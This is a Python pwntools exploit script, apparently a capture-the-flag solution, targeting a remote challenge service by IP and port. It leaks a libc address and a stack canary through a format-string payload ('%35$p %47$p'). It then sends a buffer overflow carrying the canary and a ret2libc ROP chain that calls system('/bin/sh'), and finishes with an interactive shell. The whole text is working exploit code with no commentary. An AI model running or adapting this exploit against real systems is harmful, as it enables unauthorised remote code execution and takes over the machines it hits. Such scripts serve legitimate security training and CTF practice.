from pwn import *

#p = process('./chall')
p = remote("34.252.33.37", 31472)
libc = ELF('./libc.so.6')

payload_leak = b'%35$p %47$p'
p.sendlineafter(b'ur name:\n', payload_leak)

leaked = p.recvline().strip().split(b' ')
leaked_libc_addr = int(leaked[0], 16)
leaked_canary = int(leaked[1], 16)

log.success(f"Leaked Libc Address: {hex(leaked_libc_addr)}")
log.success(f"Leaked Canary: {hex(leaked_canary)}")

LEAKED_OFFSET = 0x7ffff7e643f1 - 0x7ffff7de1000

SYSTEM_OFFSET = libc.symbols['system']
BINSH_OFFSET = next(libc.search(b'/bin/sh'))
POP_RDI_OFFSET = 0x277e5
RET_OFFSET = 0x26e99

libc_base = leaked_libc_addr - LEAKED_OFFSET
system_addr = libc_base + SYSTEM_OFFSET
bin_sh_addr = libc_base + BINSH_OFFSET
pop_rdi_ret = libc_base + POP_RDI_OFFSET
ret_gadget = libc_base + RET_OFFSET

log.info(f"Libc Base: {hex(libc_base)}")
log.info(f"System Address: {hex(system_addr)}")
log.info(f"/bin/sh Address: {hex(bin_sh_addr)}")

padding = b'A' * 328
payload_rop = padding
payload_rop += p64(leaked_canary)
payload_rop += b'B' * 8
payload_rop += p64(ret_gadget)
payload_rop += p64(pop_rdi_ret)
payload_rop += p64(bin_sh_addr)
payload_rop += p64(system_addr)

p.sendlineafter(b'send your msg:\n', payload_rop)

p.interactive()